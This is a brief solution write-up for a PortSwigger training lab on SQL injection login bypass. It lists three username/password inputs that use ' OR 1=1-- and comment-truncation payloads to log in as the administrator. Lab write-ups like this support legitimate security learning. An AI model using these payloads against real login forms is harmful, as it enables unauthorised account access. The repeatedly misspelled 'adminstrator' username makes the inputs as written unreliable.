# Lab: SQL injection vulnerability allowing login bypass

## Lab's description

This lab contains a SQL injection vulnerability in the login function.

**End gold:** Log in as `administrator` user.

## Solution

Go to My account page and login as adminstrator

Case 1:

`Username: adminstrator
Password: anything' OR 1=1--'`

Case 2:

`Username: adminstrator'--
Password: anything`

Case 3:

`Username: adminstrator' OR 1=1--\n
Password: anything`

**Source:** [Lab: Subverting application logic](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass#)
